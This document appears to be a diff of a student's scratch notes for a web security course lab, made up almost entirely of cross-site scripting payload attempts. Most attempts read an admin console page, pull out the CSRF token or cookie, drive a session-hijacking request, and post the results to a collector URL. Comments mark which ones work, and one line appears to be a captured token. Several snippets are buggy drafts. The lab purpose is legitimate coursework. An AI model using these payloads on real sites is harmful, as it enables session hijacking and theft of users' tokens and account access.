@@ -1,0 +1,187 @@
+<script>
+    var html = '<script>alert(0);<\/script>';
+    localStorage.setItem("cs6262-web-security-user-theme", html);
+</script>
+
+<script>
+    localStorage.setItem("window.gotYou", true);
+</script>
+
+&lt;script&gt;localStorage.setItem('window.gotYou', true);&lt;/script&gt;
+
+&lt;script&gt;fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: 'hi'})&lt;/script&gt;
+url: https://cs6262.gtisc.gatech.edu/writeup/28977
+
+&lt;script&gt;
+const cookie = await fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(response => response.text())
+.then(cookie => document.cookie.split('=')[1]);
+
+fetch('https://cs6262.gtisc.gatech.edu/session-hijacking/kcable3', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(response => response.text())
+.then(response => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', headers: {csrftoken:
+cookie}, body: response}));
+&lt;/script&gt;
+
+url: https://cs6262.gtisc.gatech.edu/writeup/28992
+
+
+&lt;script&gt;
+const cookie = await fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(response => response.text())
+.then(cookie => document.cookie.split('=')[1]);
+
+fetch('https://cs6262.gtisc.gatech.edu/session-hijacking/kcable3', {
+method: 'POST',
+headers: {'X-CSRFToken': cookie},
+})
+.then(response => response.text())
+.then(response => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: response}));
+&lt;/script&gt;
+
+url: https://cs6262.gtisc.gatech.edu/writeup/29006
+
+<!-- This works! opens admin panel for us -->
+&lt;script&gt;
+fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(response => response.text())
+.then(response => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: response}));
+&lt;/script&gt;
+url: https://cs6262.gtisc.gatech.edu/writeup/28996
+
+
+&lt;script&gt;
+const cookie = await fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(response => response.text())
+.then(cookie => document.cookie.split('=')[1]);
+
+fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: cookie});
+&lt;/script&gt;
+
+
+<!-- This works and gets the csrftoken successfully -->
+&lt;script&gt;
+fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(csrftoken => document.getElementsByName("csrfmiddlewaretoken")[0].value)
+.then(csrftoken => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: csrftoken}));
+&lt;/script&gt;
+
+&lt;script&gt;
+fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(fetch('/session-hijacking/kcable3', { method: 'post', headers: { 'X-CSRFToken':
+document.getElementsByName("csrfmiddlewaretoken")[0].value } }).then(res => { if (res.ok) return res.json(); else return
+{} }).then(data => {
+const { hash } = data;
+console.log(hash)
+}));
+&lt;/script&gt;
+
+
+
+fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(csrftoken => {const token = document.getElementsByName("csrfmiddlewaretoken")[0].value;
+fetch('/session-hijacking/kcable3', {
+method: 'POST',
+headers: {'X-CSRFToken': token},
+})
+.then(response => response.text())
+.then(response => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: response}));});
+
+
+<!-- This works up to the CSRF Token being wrong? Forbidden 403 -->
+&lt;script&gt;
+fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(csrftoken => document.getElementsByName("csrfmiddlewaretoken")[0].value)
+.then(csrftoken => localStorage.setItem('csrftoken', csrftoken))
+.then(csrftoken => fetch('/session-hijacking/kcable3', {
+method: 'POST',
+headers: {'X-CSRFToken': csrftoken},
+})
+.then(response => response.text()))
+.then(response => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: response}));
+&lt;/script&gt;
+
+
+<!-- This gets me my original token and the stolen token (in console) -->
+&lt;script&gt;
+let origToken2 = localStorage.getItem('csrftoken')
+let csrftoken = await fetch('https://cs6262.gtisc.gatech.edu/console', {
+method: 'GET',
+headers: {
+'Accept': 'application/json',
+},
+})
+.then(csrftoken => document.getElementsByName("csrfmiddlewaretoken")[0].value)
+localStorage.setItem('csrftoken', csrftoken)
+fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: JSON.stringify({'orig': origToken,
+'stolen': csrftoken})});
+&lt;/script&gt;
+
+OVEEOpRbactZ02U2ITn6dJsI0RYNYY5jPFlA8cf02AQbXVrsDcSpG2fl3ojjDsFS
+
+
+<!-- trying now -->
+fetch('https://cs6262.gtisc.gatech.edu/console', {
+    method: 'GET',
+    headers: {
+    'Accept': 'application/json',
+    },
+    })
+.then(function(response) {return response.text()})
+.then(function(html) {
+var parser = new DOMParser();
+var document = parser.parseFromString(html, "text/html");
+return document.getElementsByName("csrfmiddlewaretoken")[0].value
+})
+.then(fetch('/session-hijacking/kcable3', {
+    method: 'POST',
+    headers: {'X-CSRFToken': token},
+    }))
+.then(function(csrftoken) {
+    fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: csrftoken.text()});
+})
